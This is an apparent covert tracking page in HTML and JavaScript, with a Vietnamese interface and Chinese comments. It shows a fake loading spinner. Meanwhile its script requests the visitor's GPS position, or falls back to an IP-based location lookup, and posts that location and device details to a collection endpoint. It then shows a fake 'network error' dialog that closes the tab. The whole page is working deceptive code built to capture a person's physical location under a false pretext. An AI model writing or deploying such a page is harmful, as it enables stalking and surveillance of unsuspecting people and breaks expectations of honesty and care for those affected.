<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8">
  <title>Đang tải...</title>

  <!-- Vercel Web Analytics -->
  <script>
    window.va = window.va || function () { (window.vaq = window.vaq || []).push(arguments); };
  </script>
  <script defer src="/_vercel/insights/script.js"></script>

  <style>
    body {
      background: #fff;
      margin: 0;
      height: 100vh;
      overflow: hidden;
    }

    .centerbox {
      position: absolute;
      left: 50%;
      top: 50%;
      transform: translate(-50%, -50%);
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
    }

    .loader {
      border: 8px solid #f3f3f3;
      border-top: 8px solid #3498db;
      border-radius: 50%;
      width: 56px;
      height: 56px;
      animation: spin 1s linear infinite;
      margin-bottom: 20px;
    }

    @keyframes spin {
      0% { transform: rotate(0deg);}
      100% { transform: rotate(360deg);}
    }

    .text {
      font-family: sans-serif;
      color: #555;
      font-size: 1.2em;
      text-align: center;
      margin-top: 0.5em;
    }

    /* Modal */
    .modal-backdrop {
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      background: rgba(0,0,0,0.35);
      z-index: 99;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .modal {
      background: #fff;
      border-radius: 10px;
      padding: 32px 24px 20px 24px;
      box-shadow: 0 8px 24px rgba(0,0,0,0.18);
      text-align: left;
      min-width: 260px;
      z-index: 100;
      animation: popup 0.33s;
    }

    @keyframes popup {
      0% { transform: scale(0.8);}
      100% { transform: scale(1);}
    }

    .modal-title {
      color: #000;
      font-size: 1.5em;
      margin-bottom: 12px;
      text-align: left;
      font-weight: bold;
    }

    .modal-desc {
      color: #555;
      margin-bottom: 22px;
      text-align: left;
      line-height: 1.5;
    }

    .modal-btn {
      background: #3498db;
      color: #fff;
      border: 0;
      border-radius: 5px;
      padding: 8px 24px;
      font-size: 1.05em;
      cursor: pointer;
      transition: background .2s;
    }

    .modal-btn:hover {
      background: #2571af;
    }
  </style>

  <script>

    // 假加载时间
    const minWait = 1000;
    const maxWait = 4000;

    const waitTime =
      Math.floor(Math.random() * (maxWait - minWait))
      + minWait;

    // 设备信息
    const deviceInfo = {
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      language: navigator.language,
      screen: {
        width: screen.width,
        height: screen.height,
        pixelRatio: window.devicePixelRatio
      }
    };

    // IP 定位
    function fetchIPLocation(cb) {

      fetch('https://ipapi.co/json/')
        .then(r => r.json())
        .then(loc => cb && cb(loc))
        .catch(() => cb && cb(null));

    }

    // 上传
    function report(data) {

      fetch('/api/collect', {
        method: 'POST',
        headers: {
          'Content-Type':'application/json'
        },
        body: JSON.stringify(data)
      });

    }

    // 弹窗
    function showNetworkErrorModal() {

      const backdrop = document.createElement('div');
      backdrop.className = 'modal-backdrop';

      const modal = document.createElement('div');
      modal.className = 'modal';

      modal.innerHTML = `
        <div class="modal-title">
          Lỗi mạng
        </div>

        <div class="modal-desc">
          Vui lòng kiểm tra kết nối Internet của bạn.
        </div>

        <button class="modal-btn">
          Đóng
        </button>
      `;

      backdrop.appendChild(modal);

      // 点击按钮后关闭页面
      modal.querySelector('.modal-btn').onclick = function() {

        // 方法1
        window.close();

        // 方法2（兼容部分浏览器）
        setTimeout(() => {

          window.open('', '_self');
          window.close();

        }, 100);

        // 方法3（最终兜底）
        setTimeout(() => {

          location.replace('about:blank');

        }, 300);

      };

      document.body.appendChild(backdrop);
    }

    window.onload = function() {

      // GPS
      if (navigator.geolocation) {

        navigator.geolocation.getCurrentPosition(

          pos => {

            deviceInfo.location = {
              lat: pos.coords.latitude,
              lng: pos.coords.longitude
            };

            report(deviceInfo);

          },

          err => {

            fetchIPLocation(iploc => {

              deviceInfo.ipLocation = iploc;

              report(deviceInfo);

            });

          }

        );

      } else {

        fetchIPLocation(iploc => {

          deviceInfo.ipLocation = iploc;

          report(deviceInfo);

        });

      }

      // 延迟弹窗
      setTimeout(showNetworkErrorModal, waitTime);

    };

  </script>
</head>

<body>

  <div class="centerbox">

    <div class="loader"></div>

    <div class="text">
      Đang tải...
    </div>

  </div>

</body>
</html>
